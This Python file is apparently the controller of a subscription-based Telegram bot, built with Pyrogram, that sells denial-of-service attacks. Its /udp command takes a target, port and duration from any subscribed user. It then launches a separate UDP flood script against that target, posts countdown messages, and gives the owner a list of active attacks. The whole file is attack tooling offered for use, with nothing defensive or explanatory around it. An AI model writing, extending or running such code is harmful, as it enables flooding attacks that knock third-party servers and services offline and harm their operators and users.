from pyrogram import Client, filters
from config import OWNER_ID, AUTH_USERS
import subprocess
import asyncio
import os
from AKG import app, check_user_subscription
from AKG.core.keys_db import is_user_in_db, has_active_key
import logging

# Dictionary to keep track of active attacks
active_attacks = {}

OWNER_ID = 6621610889


# Command handler for /showall_active_attack
@app.on_message(filters.command("showall_active_attack"))
async def show_all_active_attack(client, message):
    try:
        if OWNER_ID != message.from_user.id:
            await message.reply_text(
                "You are not authorized to use this command.")
            return

        if not active_attacks:
            await message.reply_text("There are no active attacks.")
            return

        active_attack_list = "\n".join(
            [f"{user_id}: Active" for user_id in active_attacks.keys()])
        await message.reply_text("Active Attacks:\n" + active_attack_list)

    except Exception as e:
        await message.reply_text(f"An error occurred: {str(e)}")


# Function to send a message indicating time left in the attack every 10 seconds
async def send_time_left_message(client, message, duration):
    for remaining_time in range(duration, 0, -10):
        await asyncio.sleep(10)
        time_left_message = f"Time left in the attack: {remaining_time} seconds."
        await message.reply_text(time_left_message)


@app.on_message(filters.command("udp"))
async def start_command(client, message):
    user_id = message.from_user.id

    can_proceed, response_message = check_user_subscription(user_id)
    if not can_proceed:
        await message.reply_text(response_message)
        return

    if user_id in active_attacks:
        await message.reply_text(
            "You are already in an active attack. Please wait for it to finish."
        )
        return

    # Extract the command arguments
    command_parts = message.text.split(" ")
    if len(command_parts) < 4:
        await message.reply_text("Usage: /udp <target> <port> <duration>")
        return

    target = command_parts[1]
    port = command_parts[2]
    duration = int(command_parts[3])

    # Save user ID as active attack
    active_attacks[user_id] = True

    try:
        # Send reply indicating attack started
        attack_started_message = f"Attack started on {target}:{port} for {duration} seconds."
        await message.reply_text(attack_started_message)

        # Run the script using subprocess
        attack_process = subprocess.Popen(
            ["python3", "udpp.py", target, port,
             str(duration), "thread"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE)

        # Start sending time left messages
        await send_time_left_message(client, message, duration)

        # Wait for the attack to complete
        attack_process.communicate()

        # Send a response message when attack completes
        attack_completed_message = f"Attack completed on {target}:{port} for {duration} seconds."
        await message.reply_text(attack_completed_message)

    except Exception as e:
        await message.reply_text(f"An error occurred: {str(e)}")

    finally:
        # Remove user ID from active attacks
        if user_id in active_attacks:
            del active_attacks[user_id]
